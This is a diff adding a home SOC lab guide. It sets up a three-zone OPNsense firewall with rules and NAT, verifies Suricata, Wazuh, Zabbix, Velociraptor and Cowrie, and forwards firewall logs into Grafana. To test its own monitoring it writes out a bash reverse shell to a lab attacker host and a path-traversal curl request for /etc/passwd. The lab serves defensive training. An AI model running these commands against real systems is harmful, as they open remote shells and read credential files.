@@ -1,0 +1,177 @@
+========================================================
+   SOC LAB - PHASE 3 IMPLEMENTATION (FIREWALLED + NAT)
+   OPNsense firewall | 3-zone DMZ security model
+   EXTRANET (WAN) <-> DMZ (OPT1) <-> INTRANET (LAN)
+   Sensor tap on DMZ | Admin over 192.168.56.x | Verify: Grafana
+========================================================
+
+WHAT CHANGED FROM PHASE 2
+  Phase 2 = pure routing (VyOS, no NAT). Every log named the real
+  attacker. Phase 3 replaces the router with a STATEFUL FIREWALL that
+  (a) enforces least-privilege between three trust zones and (b) runs
+  Source NAT on egress to the Extranet - which will deliberately BREAK
+  attribution and force the SOC to correlate instead of trust one log.
+
+TOPOLOGY (OPNsense = the only path between zones)
+  EXTRANET  (WAN  em0)  10.10.0.0/24    attacker .40            gw .1
+  INTRANET  (LAN  em1)  10.10.10.0/24   client .50 + SOC        gw .1
+       SOC: wazuh .20  zabbix .22  velociraptor .23  grafana .24
+  DMZ       (OPT1 em2)  10.10.20.0/24   server A(web) .60,
+                                        honeypot .70            gw .1
+  Sensor:               passive tap on the DMZ segment (promisc)
+  Management:           192.168.56.x  (SOC out-of-band, unchanged)
+
+TRUST LEVELS (Cisco ASA style - trust flows downhill only)
+  EXTRANET = 0    DMZ = 50    INTRANET = 100
+  A lower zone may reach a higher one ONLY through an explicit hole.
+
+
+--------------------------------------------------------
+PART 1 - REACH THE FIREWALL GUI (out-of-band)
+--------------------------------------------------------
+From the desktop, tunnel to the OPNsense web GUI through the wazuh
+jump host (the firewall has no management IP of its own on 192.168.56):
+
+  ssh -L 8080:10.10.10.1:80 soc@192.168.56.20 -N
+  # then browse:  http://localhost:8080   (login: root)
+
+Say: "The firewall is managed in-band from the trusted zone only -
+never exposed to the Extranet."
+
+
+--------------------------------------------------------
+PART 2 - THE INTERFACE / ZONE ASSIGNMENT
+--------------------------------------------------------
+Interfaces -> Assignments:
+  em0 -> WAN  = EXTRANET   10.10.0.1/24    (intnet "extranet")
+  em1 -> LAN  = INTRANET   10.10.10.1/24   (intnet "labnet")
+  em2 -> OPT1 = DMZ        10.10.20.1/24   (intnet "vlan20")
+
+Prove the three zones are live from the attacker (Extranet):
+  ping -c2 10.10.20.60      # DMZ web server (published)  -> reply
+  ping -c2 10.10.10.50      # INTRANET client             -> BLOCKED
+  ping -c2 10.10.0.1        # the firewall itself         -> BLOCKED
+
+Say: "One box, three legs, three trust levels. The Extranet can touch
+exactly one thing - the web server - and nothing else."
+
+
+--------------------------------------------------------
+PART 3 - THE FIREWALL RULES (least-privilege, per-interface)
+--------------------------------------------------------
+Rules match where traffic ENTERS. First-match wins. Default = deny+log.
+
+EXTRANET (WAN) tab:
+  1) pass  TCP  any -> 10.10.20.60 : 80      (publish ONLY the web server)
+  2) block any  any -> any                   (log)
+  GOTCHA: leave Source Port = ANY. Setting it to HTTP blocks every real
+  client (clients use random source ports) and the web server goes dark.
+
+DMZ (OPT1) tab:
+  1) pass  TCP  DMZ net -> alias SOC_SERVERS   (agents report to SOC)
+        SOC_SERVERS = 10.10.10.20 / .22 / .23  (wazuh/zabbix/velo)
+  2) pass  TCP  10.10.20.60 -> 10.10.10.50 : 22   (the ONE pivot hole)
+  3) block any  DMZ net -> any                 (log)
+  NOTE: aliases need their OWN Apply, separate from the rules Apply,
+        or they resolve to empty and the rule matches nothing.
+
+INTRANET (LAN) tab:
+  1) pass any -> any            (trusted zone, allow-all outbound)
+
+Say: "Every zone has its own doormat. The DMZ can talk to three SOC
+agents and reach exactly one SSH box inside - that pivot hole is
+deliberate, so I can watch what an attacker does with it."
+
+
+--------------------------------------------------------
+PART 4 - NAT (the attribution trap)
+--------------------------------------------------------
+Firewall -> NAT -> Outbound = Automatic.
+  Automatic Source NAT rewrites the SOURCE only on egress toward the
+  EXTRANET. So a connection DMZ(10.10.20.60) -> Extranet(10.10.0.40)
+  leaves the firewall looking like it came from 10.10.0.1.
+  Inbound (attacker->web) and inter-zone (DMZ<->Intranet) are NOT NAT'd
+  - real IPs are preserved there.
+
+Prove NAT is on (attacker listens, web server dials out):
+  # attacker:   nc -lvnp 4444
+  # web server: bash -i >& /dev/tcp/10.10.0.40/4444 0>&1
+  -> the attacker sees the connection arrive from 10.10.0.1, NOT .60.
+
+Say: "Source NAT is convenience for the network and a lie to the
+investigator. The C2 callback looks like it came from the firewall."
+
+
+--------------------------------------------------------
+PART 5 - VERIFY ALL 5 PLANES (now behind the firewall)
+--------------------------------------------------------
+=== NETWORK (Suricata + Zeek on the DMZ tap) ===
+  # attacker: hit the published web server
+  curl "http://10.10.20.60/download.php?file=../../../../etc/passwd"
+  # sensor:
+  sudo tail -40 /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | "\(.src_ip) -> \(.dest_ip) | \(.alert.signature)"'
+  PASS = LFI alert (sid 9000010) naming the REAL src 10.10.0.40
+
+=== ENDPOINT (Wazuh - agents report from all three zones) ===
+  ssh soc@192.168.56.20 'sudo grep -c . /var/ossec/logs/alerts/alerts.json'
+
+=== AVAILABILITY (Zabbix - watches the web server + honeypot) ===
+  Zabbix -> Latest data -> server A CPU / ICMP ping
+
+=== FORENSIC (Velociraptor - agent on the DMZ web server) ===
+  Velo -> hunt -> collect the /var/www + shell history from .60
+
+=== DECEPTION (Cowrie honeypot .70 in the DMZ) ===
+  ssh soc@192.168.56.20 'sudo grep -c . /var/log/suricata/eve.json' # tap
+  cowrie.json still logs fake-sshd sessions in the exposed zone
+
+
+--------------------------------------------------------
+PART 6 - FIREWALL LOGS -> SOC (Part E, the new pipeline)
+--------------------------------------------------------
+This is the capability Phase 3 adds: the firewall itself becomes a log
+source, so the SOC sees BLOCKS the sensor can never see (the sensor only
+taps the DMZ; the firewall sees all three legs).
+
+Pipeline:
+  filterlog -> rsyslog(OPNsense) --UDP 514--> wazuh:/var/log/opnsense.log
+           -> Wazuh <localfile> -> analysisd -> alerts.json -> Grafana
+
+On the firewall: System -> Settings -> Logging/Remote
+  Target = 10.10.10.20 : 514 (UDP), Application = "filter"
+
+On wazuh, /etc/rsyslog.d/30-opnsense.conf:
+  module(load="imudp")
+  input(type="imudp" port="514")
+  if ($fromhost-ip == "10.10.10.1") then {
+      action(type="omfile" file="/var/log/opnsense.log"
+             template="RSYSLOG_TraditionalFileFormat")   # BSD ts REQUIRED
+      stop
+  }
+Wazuh reads it with a <localfile> (log_format syslog). Wazuh ships the
+decoder (name "pf") + rules: 87701 = single block (lvl5),
+87702 = many blocks same src (lvl10, MITRE T1110). Firewall alerts are
+agent 000 (manager), group "pfsense".
+
+Verify in Grafana -> Explore:   rule.groups:pfsense
+  GOTCHA: this Wazuh writes JSON only. Alerts land in alerts.json,
+  never alerts.log. Dashboards 01-05 filter to sensor (agent 002),
+  so firewall blocks need their own "Firewall Blocks" panel.
+
+Say: "The sensor sees the DMZ. The firewall sees everything it denies.
+Together they cover the whole board."
+
+
+--------------------------------------------------------
+KEY FILES (Phase 3)
+--------------------------------------------------------
+  /conf/config.xml (OPNsense)      - interfaces, rules, NAT, aliases
+  /etc/rsyslog.d/30-opnsense.conf  - firewall syslog -> file (on wazuh)
+  /var/ossec/etc/ossec.conf        - <localfile> for opnsense.log
+  0455-pfsense_decoders / 0540-pfsense_rules - shipped pf decoder+rules
+  /var/www/html/index.html (.60)   - the bait web app (search/download/admin)
+  /etc/netplan/99-labnet.yaml (.60/.70/.50) - per-zone static routes
+  /var/log/suricata/eve.json (sensor) - network alerts
+  /var/lib/suricata/rules/local.rules - custom sigs (see attacks file)
+
+SNAPSHOT: phase3-final (all 10 VMs, cold).
